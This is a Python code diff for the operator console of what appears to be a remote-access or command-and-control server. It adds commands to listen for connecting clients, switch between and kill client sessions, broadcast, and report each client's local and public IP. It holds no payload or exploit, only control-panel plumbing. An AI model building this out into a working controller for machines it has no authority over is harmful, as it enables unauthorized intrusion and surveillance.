@@ -2,12 +2,12 @@ from prompt_toolkit import PromptSession
 from prompt_toolkit.history import InMemoryHistory
 from prompt_toolkit.completion import WordCompleter, NestedCompleter
 from src.ui.colors import Colors as cl
-from src.utils.client_handler import get_client_by_id, list_clients, clients
+from src.utils.client_handler import get_client_by_id, list_clients, clients, handle_client
 from src.ui.help import show_main_help, show_client_help
 
 
 
-def main_loop():
+def main_loop(sock):
     cmd_commands = ["sessions", "broadcast", "exit", "help"]  
     completer = WordCompleter(cmd_commands)  
     cmd_session = PromptSession(completer=completer, history=InMemoryHistory())  
@@ -17,20 +17,26 @@ def main_loop():
             cmd = cmd_session.prompt("cmd> ")  
             if cmd == "exit":  
                 if cmd == "exit":
-                    confirm = input("Exit server? (y/n): ").lower()
+                    confirm = input(f"{cl.yellow}[?] Exit server? (y/n): {cl.reset}").lower()
                     if confirm == 'y':
+                        print(f"{cl.yellow}[*] Exiting...{cl.reset}")
+                        sock.close()
                         exit()
 
             elif cmd == "help":
                 show_main_help()
 
-            elif cmd.startswith("sessions"):
+            elif cmd == "listen":
+                print(f"{cl.yellow}[*] Waiting for a client to connect...{cl.reset}")
+                handle_client(sock)
+
+            elif cmd.startswith("sessions "):
                 choice = cmd[8:].strip()
                 cl_info = get_client_by_id(clients, choice)
                 print(f"{cl.cyan}[+] Switching to client {cmd}{cl.reset}")
                 client_loop(cl_info)
 
-            elif cmd.strip() == "sessions":  
+            elif cmd.strip() == "sessions":
                 list_clients(clients) 
 
             elif cmd.strip() == "broadcast": 
@@ -66,7 +72,11 @@ def client_loop(client_info):
                 print(f"{cl.cyan}[*] Client {client_info['id']} IP Report:")
                 print(f"    Local IP: {client_info.get('local_ip', 'unknown')}")
                 print(f"    Public IP: {client_info.get('public_ip', 'unknown')}{cl.reset}")
-                
+            
+            elif cmd == "kill":
+                print(f"{cl.blue}[-] Killing the session with the client{cl.reset}")
+                break
+
             elif cmd == "back":
                 print(f"{cl.blue}[+] Returning to main session{cl.reset}")
                 break
